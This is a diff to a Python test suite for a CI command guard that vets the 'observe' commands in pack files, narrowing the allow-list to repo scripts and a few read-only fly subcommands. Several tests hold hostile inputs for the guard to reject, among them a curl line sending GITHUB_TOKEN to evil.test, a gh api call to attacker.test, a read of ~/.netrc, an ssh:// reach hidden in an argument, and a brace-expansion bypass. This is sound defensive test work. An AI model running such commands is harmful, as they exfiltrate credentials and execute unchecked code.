@@ -90,6 +90,27 @@ def test_shell_composition_innocence_sha_placeholder_is_not_expansion():
     ) == []
 
 
+def test_shell_composition_guilt_brace_expansion_defeats_the_marker_check():
+    """kimi-code/k3, refuting the two-shape cut (RULED 2026-09-04 b), reproduced here.
+
+    `_guard_observable_script` checks the LITERAL path `scripts/ci/{evil,evil}.py`
+    - a file an attacker's PR can add, carrying the marker, with harmless content.
+    A shell expands the observe STRING before python3 ever runs, turning that one
+    token into two: `scripts/ci/evil.py` and `scripts/ci/evil.py`. python3 executes
+    the FIRST one - a file that never carried the marker and was never checked at
+    all. `{`/`}` closed this; `*`/`?`/`[` (glob) were declined - they only expand
+    against a file that already exists, a weaker primitive, and `?` collides with
+    an innocent URL query string this module already accepts.
+    """
+    assert bp._guard_shell_composition("python3 scripts/ci/{evil,evil}.py")
+
+
+def test_shell_composition_innocence_braces_in_the_sha_placeholder_pass():
+    assert bp._guard_shell_composition(
+        "python3 scripts/ci/bites_parse.py --selftest {sha}"
+    ) == []
+
+
 # ------------------------------------------------- _guard_command_allowlist
 
 
@@ -189,14 +210,15 @@ def test_command_allowlist_guilt_gh_pointing_at_another_repo_is_rejected():
 
 
 def test_command_allowlist_innocence_every_real_shape_passes():
-    """The shapes real observations actually take must all survive."""
+    """RULED 2026-09-04 b: the shapes an observation may ACTUALLY take now - a
+    repo script or a read-only fly subcommand, nothing else."""
     for command in (
         "python3 scripts/pending_arms_report.py",
-        "python3 -m pytest scripts/tests/test_bites_parse.py",
-        "gh pr view 5658 --json state",
-        "git log -1 --format=%H",
+        "python3 scripts/ci/bites_parse.py --selftest",
         "flyctl status -a nuzantara-rag",
-        "curl -sS https://nuzantara-rag.fly.dev/health",
+        "fly releases -a nuzantara-rag",
+        "flyctl image show -a nuzantara-rag",
+        "fly machine list -a nuzantara-rag",
     ):
         assert bp._guard_command_allowlist(command) == [], command
 
@@ -207,11 +229,12 @@ def test_command_allowlist_innocence_every_real_shape_passes():
 def test_no_remote_shell_guilt_reach_hidden_in_an_argument_is_rejected():
     """The under-match twin, and the assertion is what proves the two guards differ.
 
-    `git log` is a permitted subcommand and the allow-list passes this command in full
-    — it inspects the program and the subcommand, not every argument. The reach lives
-    in the ARGUMENT, which is exactly the shape a head-of-command guard cannot see.
+    `fly status` is a permitted subcommand and the allow-list passes this command in
+    full — it inspects the program and the subcommand, not every argument. The reach
+    lives in the ARGUMENT, which is exactly the shape a head-of-command guard cannot
+    see.
     """
-    command = "git log ssh://evil.test/repo"
+    command = "fly status -a ssh://evil.test/repo"
     assert bp._guard_command_allowlist(command) == [], "premise: the allow-list passes it"
     assert bp._guard_no_remote_shell(command)
 
@@ -286,10 +309,14 @@ def test_observable_script_innocence_this_module_declares_itself():
     assert bp._guard_observable_script("python3 scripts/ci/bites_parse.py --selftest") == []
 
 
-def test_observable_script_innocence_pytest_under_tests_passes():
-    assert bp._guard_observable_script(
-        "python3 -m pytest scripts/tests/test_bites_parse.py"
-    ) == []
+def test_observable_script_guilt_marker_string_in_a_non_py_file_is_rejected():
+    """kimi-code/k3, refuting the two-shape cut's final bytes, reproduced here:
+    the marker check was a byte-substring grep over ANY file `python3` is
+    pointed at, extension included - `bites_allowlist.yaml` itself carries the
+    literal marker in its own `observable_marker:` key, so it parsed as
+    executable before this guard learned that a script declares itself
+    reachable, but a data file cannot."""
+    assert bp._guard_observable_script("python3 scripts/ci/bites_allowlist.yaml")
 
 
 # ------------------------------------------------- the pack layer itself
@@ -344,9 +371,10 @@ def test_innocence_an_ordinary_pack_with_other_keys_still_parses():
     """The pack schema is open — `bites:` must not care what else the file carries."""
     pack = (
         "gear: 3\nbrief_ref: evidence/brief.yml\nspend:\n  tokens: 1\n"
-        "bites:\n  consumer: CI\n  where: ci\n  observe: git status\n  expect: exit0\n"
+        "bites:\n  consumer: CI\n  where: ci\n"
+        "  observe: python3 scripts/ci/bites_parse.py --selftest\n  expect: exit0\n"
     )
-    assert bp.parse_pack(pack).get("observe") == "git status"
+    assert bp.parse_pack(pack).get("observe") == "python3 scripts/ci/bites_parse.py --selftest"
 
 
 def test_a_yaml_typed_scalar_is_refused_rather_than_coerced():
@@ -407,9 +435,10 @@ def test_innocence_ordinary_unicode_in_a_pack_is_not_penalised():
     """Narrowness: the rule is invisible characters, not non-ASCII ones."""
     pack = (
         "notes: an em-dash — and an accent é are ordinary prose\n"
-        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
+        "bites:\n  consumer: x\n  where: ci\n"
+        "  observe: python3 scripts/ci/bites_parse.py --selftest\n  expect: exit0\n"
     )
-    assert bp.parse_pack(pack).get("observe") == "git status"
+    assert bp.parse_pack(pack).get("observe") == "python3 scripts/ci/bites_parse.py --selftest"
 
 
 # --- the hole Zero's order named: every allow-list entry is a full pair
@@ -427,13 +456,36 @@ def test_command_allowlist_guilt_fly_version_upgrade_replaces_the_binary():
     assert bp._guard_command_allowlist("flyctl version upgrade")
 
 
-def test_command_allowlist_innocence_fly_version_and_flagged_reads_pass():
+def test_command_allowlist_innocence_the_four_surviving_fly_pairs_pass():
+    """RULED 2026-09-04 b removed `version` (and `machine status`) from the table
+    entirely - only these four subcommands survive."""
     for command in (
-        "fly version",
-        "flyctl version",
         "flyctl status -a nuzantara-rag",
+        "fly releases -a nuzantara-rag",
+        "flyctl image show -a nuzantara-rag",
+        "fly machine list -a nuzantara-rag",
     ):
         assert bp._guard_command_allowlist(command) == [], command
+
+
+def test_command_allowlist_guilt_fly_image_show_extra_positional_is_rejected():
+    """kimi-code/k3, refuting the two-shape cut's final bytes, reproduced here:
+    `_subcommand_permitted` matched only `words[0]`/`words[1]`, so a THIRD leading
+    word rode through unexamined - `fly image show <ref>` matched the `(image,
+    show)` pair while `<ref>` was never looked at, and flyctl's `image show`
+    does not reject the extra argv itself. The match is now exact-length.
+    """
+    assert bp._guard_command_allowlist("fly image show extra-ref")
+    assert bp._guard_command_allowlist("flyctl image show extra-ref")
+
+
+def test_command_allowlist_guilt_fly_extra_positional_after_a_flag_value_is_rejected():
+    """kimi-code/k3's other finding on the same refutation: a flag's own VALUE
+    ends the leading-word run, so a positional planted AFTER it (`fly status -a
+    app anyword`) was never inspected by either the subcommand-table check
+    (already past it) or the flag check (only looks at `-` tokens)."""
+    assert bp._guard_command_allowlist("fly status -a nuzantara-rag anyword")
+    assert bp._guard_command_allowlist("flyctl releases --app nuzantara-rag anyword")
 
 
 def test_leading_words_stops_at_the_first_flag():
@@ -448,16 +500,18 @@ def test_leading_words_stops_at_the_first_flag():
     assert bp._leading_words(["-a", "app", "status"]) == []
 
 
-def test_subcommand_sentinels_mean_two_different_things():
-    """ANY_POSITIONAL admits a data word; NO_SUBCOMMAND admits none."""
-    table = (("api", bp.ANY_POSITIONAL), ("version", bp.NO_SUBCOMMAND))
-    assert bp._subcommand_permitted(["api", "repos/o/r"], table)
-    assert bp._subcommand_permitted(["version"], table)
-    assert not bp._subcommand_permitted(["version", "upgrade"], table)
+def test_subcommand_sentinel_means_nothing_but_flags_may_follow():
+    """NO_SUBCOMMAND admits no second word; the surviving fly pairs use it.
 
-
-def test_gh_api_still_takes_its_endpoint_positional():
-    assert bp._guard_command_allowlist("gh api repos/o/r/pulls/1") == []
+    `ANY_POSITIONAL` existed only for `gh api <path>` and left with `gh` under
+    RULED 2026-09-04 b - the surviving `fly` surface has no equivalent need for
+    "a data argument follows, never a verb".
+    """
+    table = (("status", bp.NO_SUBCOMMAND), ("image", "show"))
+    assert bp._subcommand_permitted(["status"], table)
+    assert not bp._subcommand_permitted(["status", "upgrade"], table)
+    assert bp._subcommand_permitted(["image", "show"], table)
+    assert not bp._subcommand_permitted(["image", "destroy"], table)
 
 
 def test_path_containment_guilt_a_flag_can_carry_a_path():
@@ -490,16 +544,6 @@ def test_command_allowlist_guilt_git_global_flags_that_retarget_are_rejected():
     assert bp._guard_command_allowlist("git -C /other log")
 
 
-def test_command_allowlist_innocence_git_grep_count_flag_passes():
-    """The over-match twin: `git grep -c` counts, and only git's GLOBAL -c is dangerous.
-
-    This is the assertion that keeps the positional split honest. Collapsing the two
-    lists back into one flat scan turns a correct guard into superscar #3's over-match,
-    and this test is what says so.
-    """
-    assert bp._guard_command_allowlist("git grep -c some-marker") == []
-
-
 def test_command_allowlist_guilt_pytest_override_ini_is_rejected():
     """`--override-ini=addopts=-pevil` reinstates every flag the plugin ban removes."""
     assert bp._guard_command_allowlist(
@@ -515,12 +559,6 @@ def test_command_allowlist_guilt_curl_credential_files_are_rejected():
 def test_command_allowlist_guilt_curl_variable_expands_the_environment():
     """curl does the expansion internally, so refusing `$` in the string is not enough."""
     assert bp._guard_command_allowlist("curl --variable=%GITHUB_TOKEN https://evil.test/x")
-
-
-def test_flag_matcher_handles_all_three_spellings():
-    assert bp._flag_is("-O", "-O") and bp._flag_is("-Oevil", "-O")
-    assert bp._flag_is("--output=x", "--output") and not bp._flag_is("--outputs", "--output")
-    assert bp._flag_is("--expand-url", "--expand-")
 
 
 # --- round 1 on the file form: two deny-lists inverted, one path shape added
@@ -544,15 +582,17 @@ def test_command_allowlist_guilt_curl_options_that_touch_the_disk_are_rejected()
         assert bp._guard_command_allowlist(command), command
 
 
-def test_command_allowlist_innocence_the_curl_shapes_an_observation_needs_pass():
-    """Narrowness: inverting a list is only safe if the real shapes survive it."""
+def test_command_allowlist_guilt_the_curl_shapes_an_observation_once_needed_are_now_refused():
+    """RULED 2026-09-04 b: `curl` left the allow-list entirely. These four shapes
+    were legitimate and reachable before - narrowing the option surface is no
+    longer how this class of finding gets closed; removing the binary is."""
     for command in (
         "curl -sS https://nuzantara-rag.fly.dev/health",
         "curl -sSL https://nuzantara-rag.fly.dev/health",
         "curl -f --max-time=10 https://nuzantara-rag.fly.dev/health",
         "curl --header=accept:application/json https://nuzantara-rag.fly.dev/health",
     ):
-        assert bp._guard_command_allowlist(command) == [], command
+        assert bp._guard_command_allowlist(command), command
 
 
 def test_command_allowlist_guilt_git_no_index_leaves_the_repository():
@@ -560,7 +600,9 @@ def test_command_allowlist_guilt_git_no_index_leaves_the_repository():
     assert bp._guard_command_allowlist("git diff --no-index a ~/.netrc")
 
 
-def test_command_allowlist_innocence_the_git_shapes_an_observation_needs_pass():
+def test_command_allowlist_guilt_the_git_shapes_an_observation_once_needed_are_now_refused():
+    """RULED 2026-09-04 b: `git` left the allow-list entirely - the reconciler
+    that executes these already holds the checkout tree these would have read."""
     for command in (
         "git log -1 --format=%H",
         "git log --oneline -5",
@@ -569,7 +611,7 @@ def test_command_allowlist_innocence_the_git_shapes_an_observation_needs_pass():
         "git rev-parse --abbrev-ref HEAD",
         "git show --name-only HEAD",
     ):
-        assert bp._guard_command_allowlist(command) == [], command
+        assert bp._guard_command_allowlist(command), command
 
 
 def test_path_containment_guilt_a_home_relative_path_is_an_escape():
@@ -588,11 +630,6 @@ def test_path_containment_innocence_a_tilde_inside_a_word_is_not_an_escape():
     """The over-match twin: `~` only escapes in first position."""
     assert bp._guard_path_containment("python3 scripts/x.py evidence/a~b/pack.yml") == []
     assert bp._guard_path_containment("git log --grep=approx~") == []
-
-
-def test_is_count_flag_accepts_only_a_bare_short_number():
-    assert bp._is_count_flag("-1") and bp._is_count_flag("-20")
-    assert not bp._is_count_flag("-O") and not bp._is_count_flag("--1x") and not bp._is_count_flag("-")
 
 
 # ------------------------------------------------- _guard_expect_form
@@ -634,13 +671,15 @@ def test_command_allowlist_guilt_pytest_options_that_write_are_rejected():
         assert bp._guard_command_allowlist(command), command
 
 
-def test_command_allowlist_innocence_the_pytest_shapes_an_observation_needs_pass():
+def test_command_allowlist_guilt_the_pytest_shapes_an_observation_once_needed_are_now_refused():
+    """RULED 2026-09-04 b: `python3 -m pytest` left with every other first token -
+    wrap a test run in a script under scripts/ci/ and observe that instead."""
     for command in (
         "python3 -m pytest scripts/tests/test_bites_parse.py",
         "python3 -m pytest -q scripts/tests/test_bites_parse.py",
         "python3 -m pytest -x --tb=short scripts/tests/test_bites_parse.py",
     ):
-        assert bp._guard_command_allowlist(command) == [], command
+        assert bp._guard_command_allowlist(command), command
 
 
 def test_expect_form_guilt_a_regex_that_burns_runner_cpu_is_rejected():
@@ -765,14 +804,13 @@ def test_args_from_file_innocence_an_email_shaped_value_is_not_a_file_read():
     assert bp._guard_args_from_file("git log --grep=user@host") == []
 
 
-def test_command_allowlist_innocence_the_gh_fly_and_git_shapes_still_pass():
+def test_command_allowlist_innocence_the_fly_shapes_still_pass():
+    """RULED 2026-09-04 b narrowed fly's flags to `-a`/`--app` only - the gh and
+    git shapes this test used to also assert here are gone with their binaries
+    (see the guilt tests documenting that flip instead)."""
     for command in (
-        "gh pr view 5658 --json state",
-        "gh api repos/o/r/pulls/1 --json state",
         "flyctl status -a nuzantara-rag",
-        "flyctl machine list -a nuzantara-rag --json",
-        "git log -1 --format=%H",
-        "git diff --stat HEAD",
+        "flyctl machine list -a nuzantara-rag",
     ):
         assert bp._guard_command_allowlist(command) == [], command
 
@@ -827,15 +865,11 @@ def test_path_containment_guilt_the_two_escapes_a_slash_split_misses():
     assert bp._guard_path_containment("python3 scripts/x.py --out=1,1:../secret")
 
 
-def test_command_allowlist_innocence_the_repo_own_idioms_survived_the_inversion():
-    """The half a reviewer has to be ASKED for: what did inverting three lists break?
-
-    Each of these is read-only and each is already in daily use in this repository —
-    `--diff-filter=` in eight files, `--no-renames` in eleven, `curl -m 5` in five,
-    `-w '%{http_code}'` as the standard health check. Three of them were refused by the
-    first draft of the inversion, which is the over-match twin of the holes the
-    inversion closed.
-    """
+def test_command_allowlist_guilt_the_repo_own_idioms_are_now_refused_too():
+    """These were read-only and legitimate before - `--diff-filter=` in eight
+    files, `--no-renames` in eleven, `curl -m 5` in five, `-w '%{http_code}'` as
+    the standard health check - and RULED 2026-09-04 b refuses them anyway,
+    because the whole binary is gone now, not just narrowed."""
     for command in (
         "git diff --cached --name-only --diff-filter=ACMR",
         "git diff --name-only -- apps/backend-rag",
@@ -845,7 +879,7 @@ def test_command_allowlist_innocence_the_repo_own_idioms_survived_the_inversion(
         "curl -fsS -m 5 https://nuzantara-rag.fly.dev/health",
         "curl -sS -w %{http_code} https://nuzantara-rag.fly.dev/health",
     ):
-        assert bp._guard_command_allowlist(command) == [], command
+        assert bp._guard_command_allowlist(command), command
 
 
 def test_curl_still_takes_exactly_one_url_after_the_arity_fix():
@@ -1019,12 +1053,6 @@ def test_command_allowlist_guilt_gh_jq_reaches_the_runner_environment():
     assert bp._guard_command_allowlist("gh api repos/o/r --jq .name")
 
 
-def test_command_allowlist_innocence_the_gh_shape_that_survives_jq_removal():
-    """Removing `--jq` must not remove gh: `--json` plus `expect: contains:` is the form."""
-    assert bp._guard_command_allowlist("gh pr view 5658 --json state") == []
-    assert bp._guard_command_allowlist("gh api repos/o/r --json url") == []
-
-
 def test_command_allowlist_guilt_fly_logs_crosses_the_output_boundary():
     """Read-only to fly, but it pipes production logs into a PR-triggered CI log."""
     assert bp._guard_command_allowlist("flyctl logs -a nuzantara-rag")
@@ -1048,7 +1076,8 @@ def test_no_invisible_guilt_a_yaml_ESCAPED_zero_width_char_is_refused():
 
 
 def test_no_invisible_innocence_the_same_double_quoted_shape_without_the_escape():
-    plain = 'bites:\n  consumer: "xY"\n  where: ci\n  observe: git status\n  expect: exit0\n'
+    plain = ('bites:\n  consumer: "xY"\n  where: ci\n'
+             '  observe: python3 scripts/ci/bites_parse.py --selftest\n  expect: exit0\n')
     assert bp.classify(bp.parse_pack(plain)) == "executable"
 
 
@@ -1063,13 +1092,6 @@ def test_command_allowlist_guilt_gh_api_absolute_url_leaves_github():
     """
     assert bp._guard_command_allowlist("gh api https://attacker.test/collect")
     assert bp._guard_command_allowlist("gh api https://api.github.com/repos/o/r")
-
-
-def test_command_allowlist_innocence_a_gh_api_rest_path_still_passes():
-    """The over-match direction: a REST path never contains `://`."""
-    assert bp._guard_command_allowlist("gh api repos/o/r") == []
-    assert bp._guard_command_allowlist("gh api repos/o/r --json url") == []
-    assert bp._guard_command_allowlist("gh api search/issues?q=repo:o/r") == []
 
 
 def test_command_allowlist_guilt_gh_template_is_refused_with_jq():
@@ -1091,9 +1113,11 @@ def test_command_allowlist_guilt_git_format_placeholder_in_a_SEPARATE_value():
     assert bp._guard_command_allowlist("git log --format %H")
 
 
-def test_command_allowlist_innocence_the_glued_format_shapes_still_pass():
+def test_command_allowlist_guilt_the_glued_format_shapes_are_now_refused_too():
+    """RULED 2026-09-04 b: `git` is gone entirely now, not just narrowed - closing
+    the loop on the git-format saga (placeholder blindness, then the whole binary)."""
     for command in ("git log --format=%H", "git log --pretty=%h", "git log --oneline -1"):
-        assert bp._guard_command_allowlist(command) == [], command
+        assert bp._guard_command_allowlist(command), command
 
 
 def _spec_variant(tmp_path, extra):
